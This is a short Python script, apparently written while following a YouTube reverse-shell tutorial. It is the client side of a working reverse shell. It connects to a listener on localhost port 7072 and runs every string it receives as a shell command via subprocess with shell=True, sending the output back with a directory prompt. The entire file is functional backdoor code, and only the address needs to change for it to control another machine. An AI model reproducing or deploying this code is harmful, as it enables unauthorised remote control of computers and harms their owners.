#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue Jan 28 12:05:38 2020

THis is from a youtube tutorial: Python Reverse Shell Tutorial - 1 through 3
from user: thenewboston

@author: winter
"""

import os
import socket
import subprocess

def printHello():
    print("Hello!")

# create a TCP/IP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect the socket ot the port where the server is listening
server_address = ('localhost',7072)
print(f'connecting to {server_address[0]} port {server_address[1]}')
s.connect(server_address)

while True:
    data = s.recv(1024)
    
    if data.decode("utf-8") == 'printHello()':
        printHello()
    
    if data[:2].decode("utf-8") == 'cd':
        # doing cd doesn't return anything so let's actually do it here
        os.chdir(data[3:].decode("utf-8")) # cd into whatever directory is after "cd " (note the space)
    if len(data) > 0:
        cmd = subprocess.Popen(data.decode("utf-8"),shell = True,stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE) #any command, send to a shell window and send to the computer using subprocess
        # the pipe thing takes any output and pipes it out to the standard stream so it works the way it would if put directly into the terminal
        output_bytes = cmd.stdout.read() + cmd.stderr.read() # byte version
        output_str = output_bytes.decode("utf-8")
        s.send(bytes(output_str + str(os.getcwd()) + '> ',"utf-8"))
        print(output_str)
    
    
s.close()



    

